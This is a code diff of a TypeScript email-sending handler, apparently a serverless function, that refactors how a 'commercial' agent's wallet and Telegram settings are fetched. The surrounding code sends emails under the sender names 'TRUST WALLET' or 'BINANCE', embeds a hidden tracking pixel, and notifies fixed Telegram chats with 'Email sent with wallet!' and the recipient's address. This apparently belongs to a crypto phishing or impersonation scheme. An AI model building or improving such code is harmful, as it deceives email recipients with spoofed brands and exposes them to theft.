@@ -226,22 +226,24 @@ const handler = async (req: Request): Promise<Response> => {
       .toLowerCase()
       .includes('trustwallet');
     
-    // Check if commercial has auto_include_wallet enabled
+    // Fetch commercial data once at the beginning
     let commercialAutoIncludeWallet = false;
+    let commercialTelegramId: string | null = null;
     if (commercial_id) {
       try {
         const { data: commercialData, error: commercialError } = await supabase
           .from('commercials')
-          .select('auto_include_wallet')
+          .select('auto_include_wallet, telegram_id')
           .eq('id', commercial_id)
           .single();
         
-        if (!commercialError && commercialData?.auto_include_wallet) {
-          commercialAutoIncludeWallet = true;
-          console.log('Commercial has auto_include_wallet enabled');
+        if (!commercialError) {
+          commercialAutoIncludeWallet = !!commercialData?.auto_include_wallet;
+          commercialTelegramId = commercialData?.telegram_id || null;
+          console.log('Commercial data loaded:', { auto_include_wallet: commercialAutoIncludeWallet, telegram_id: !!commercialTelegramId });
         }
       } catch (err) {
-        console.warn('Could not fetch commercial auto_include_wallet setting:', err);
+        console.warn('Could not fetch commercial data:', err);
       }
     }
     
@@ -326,14 +328,7 @@ const handler = async (req: Request): Promise<Response> => {
     // Add tracking pixel to email content
     emailContent += `<img src="${openTrackingUrl}" width="1" height="1" style="display:none;" />`;
 
-    // Determine sender name - use "TRUST WALLET" for Trust Wallet templates
-    const isTrustWalletTemplate = (subject || content || '')
-      .toLowerCase()
-      .includes('trust') || 
-      (subject || content || '')
-      .toLowerCase()
-      .includes('trustwallet');
-    
+    // Determine sender name - use "TRUST WALLET" for Trust Wallet templates (already detected above)
     const senderName = isTrustWalletTemplate ? "TRUST WALLET" : "BINANCE";
 
     // Log email sending attempt
@@ -373,33 +368,9 @@ const handler = async (req: Request): Promise<Response> => {
         const telegramChatIds = ['1889039543', '5433409472'];
         let successfulSends = 0;
         
-        // Also fetch commercial's telegram_id if provided
-        let commercialTelegramId: string | null = null;
-        let commercialAutoIncludeWallet = false;
-        if (commercial_id) {
-          try {
-            const { data: commercialData, error: commercialError } = await supabase
-              .from('commercials')
-              .select('telegram_id, auto_include_wallet')
-              .eq('id', commercial_id)
-              .single();
-            
-            if (!commercialError) {
-              commercialTelegramId = commercialData?.telegram_id || null;
-              commercialAutoIncludeWallet = !!commercialData?.auto_include_wallet;
-              if (commercialTelegramId) {
-                console.log('Found commercial Telegram ID:', commercialTelegramId);
-              }
-              if (commercialAutoIncludeWallet) {
-                console.log('Commercial has auto_include_wallet enabled (for Telegram only)');
-              }
-            }
-          } catch (err) {
-            console.warn('Could not fetch commercial telegram/auto_include_wallet:', err);
-          }
-        }
-        
-        if (telegramBotToken) {
+         // Commercial data already fetched earlier
+         
+         if (telegramBotToken) {
           const message = `📧 Email sent with wallet!
 Recipient: ${to}
 Commercial ID: ${commercial_id}
